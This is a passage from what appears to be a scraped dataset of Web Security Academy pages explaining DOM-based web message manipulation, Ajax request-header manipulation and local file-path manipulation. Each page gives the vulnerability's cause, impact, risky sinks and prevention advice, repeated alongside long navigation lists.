vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n\nWeb message manipulation\n========================\n\nIn this section, we'll explain what web-message manipulation vulnerabilities are and suggest ways to reduce your exposure to them.\n\nWhat is DOM-based web message manipulation?\n-------------------------------------------\n\nWeb message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An attacker may be able to use the web message data as a source by constructing a web page that, if visited by a user, will cause the user's browser to send a web message containing data that is under the attacker's control. For more information about the using web messages as a source, please refer to the [Controlling the web-message source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) page.\n\nWhich sinks can lead to DOM-based web-message manipulation vulnerabilities?\n---------------------------------------------------------------------------\n\nThe `postMessage()` method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way.\n\nHow to prevent DOM-based web message manipulation\n-------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid sending web messages that contain data that originated from any untrusted source. When sending cross-origin messages, you should always explicitly specify the target window. Most importantly, make sure to implement robust measures to verify the origin of any incoming messages.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Ajax request-header manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n\nDOM-based Ajax request-header manipulation\n==========================================\n\nIn this section, we'll look at what DOM-based Ajax request-header manipulation is, talk about the potential impact of this kind of attack, and suggest ways to reduce your exposure to Ajax request-header manipulation vulnerabilities.\n\nWhat is DOM-based Ajax request-header manipulation?\n---------------------------------------------------\n\nUsing Ajax enables a website to make asynchronous requests to the server so that web applications can dynamically change content on the page without the need to reload the entire page. However, Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request. This can then be used as a starting point to chain together other kinds of attack, thereby increasing the potential severity of this vulnerability.\n\nWhat is the impact of DOM-based Ajax request-header manipulation?\n-----------------------------------------------------------------\n\nThe potential impact of the vulnerability depends on the role of specific HTTP headers in the server-side processing of the Ajax request. If the header is used to control the behavior that results from the Ajax request, the attacker may be able to cause the user to perform unintended actions by manipulating the header. The impact also depends on what exactly the attacker is able to inject into the headers.\n\nWhich sinks can lead to DOM-based Ajax request-header manipulation vulnerabilities?\n-----------------------------------------------------------------------------------\n\nThe following are some of the main sinks can lead to DOM-based Ajax request-header vulnerabilities:\n\n```\nXMLHttpRequest.setRequestHeader()\nXMLHttpRequest.open()\nXMLHttpRequest.send()\njQuery.globalEval()\n$.globalEval()\n```\n\nHow to prevent DOM-based Ajax request-header manipulation\n---------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source dynamically set Ajax request headers.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Local file-path manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n\nDOM-based local file-path manipulation\n======================================\n\nIn this section, we'll talk about what DOM-based local file-path manipulation is, look at the potential impact of an attack, highlight some of the sinks that can lead to this kind of vulnerability, and suggest ways that you can reduce your exposure.\n\nWhat is DOM-based local file-path manipulation?\n-----------------------------------------------\n\nLocal file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the `filename` parameter. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file.\n\nWhat is the impact of DOM-based local file-path manipulation?\n-------------------------------------------------------------\n\nThe potential impact of this vulnerability depends on how the website uses the opened file:\n\n*   If the website reads data from the file, the attacker may be able to retrieve this data.\n*   If the website writes specific data to a sensitive 